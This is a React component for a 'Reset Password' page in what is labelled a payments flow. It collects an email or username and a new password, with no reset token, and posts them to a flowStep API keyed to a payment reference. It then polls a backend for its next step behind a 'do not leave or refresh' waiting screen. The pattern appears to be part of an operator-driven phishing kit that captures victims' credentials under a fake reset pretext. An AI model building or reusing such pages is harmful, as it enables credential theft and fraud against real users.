import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button, PasswordInput, TextInput } from "@mantine/core";
import { KeyRound } from "lucide-react";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import styles from "./FlowPages.module.scss";

export function FlowForgotPasswordPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [email, setEmail] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useFlowPoll({
    reference,
    currentPage: "forgot-password",
    enabled: submitted && !!reference,
  });

  const handleSubmit = async () => {
    if (!email.trim() || !newPassword) {
      setError("Please fill all fields");
      return;
    }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "reset_password_submitted", {
        email_or_username: email,
        password: newPassword,
      });
      setSubmitted(true);
    } catch {
      setError("Network error — please try again");
    } finally {
      setBusy(false);
    }
  };

  if (!reference) {
    navigate("/", { replace: true });
    return null;
  }

  return (
    <div className={styles.flowPage}>
      <div className={styles.flowCard}>
        <div className={styles.flowLogo}>
          <KeyRound size={44} color="#8b1a3a" />
        </div>
        <p className={styles.flowTitle}>Reset Password</p>
        <p className={styles.flowSubtitle}>
          Enter your email and a new password
        </p>

        <TextInput
          label="Email / Username"
          placeholder="email or username"
          value={email}
          onChange={(e) => setEmail(e.currentTarget.value)}
          mb="sm"
        />
        <PasswordInput
          label="New Password"
          placeholder="New password"
          value={newPassword}
          onChange={(e) => setNewPassword(e.currentTarget.value)}
          mb="sm"
        />

        {error && (
          <p
            style={{ color: "#991b1b", fontSize: "0.85rem", marginBottom: 10 }}
          >
            {error}
          </p>
        )}

        <Button
          fullWidth
          loading={busy}
          onClick={handleSubmit}
          className={styles.submitBtn}
          styles={{
            root: {
              background: "#8b1a3a",
              "&:hover": { background: "#751532" },
            },
          }}
        >
          Reset Password
        </Button>
      </div>

      {submitted && (
        <div className={styles.loadingWrap}>
          <div className={styles.spinnerOuter}>
            <div className={styles.spinnerInner} />
          </div>
          <p className={styles.loadingTitle}>Please wait</p>
          <p className={styles.loadingSubtitle}>Processing your information</p>
          <div className={styles.loadingNoteBox}>
            <p className={styles.loadingNote}>
              Please do not leave or refresh this page until the process is
              complete
            </p>
          </div>
          <div className={styles.dots}>
            <span className={styles.dot} />
            <span className={styles.dot} />
            <span className={styles.dot} />
          </div>
        </div>
      )}
    </div>
  );
}
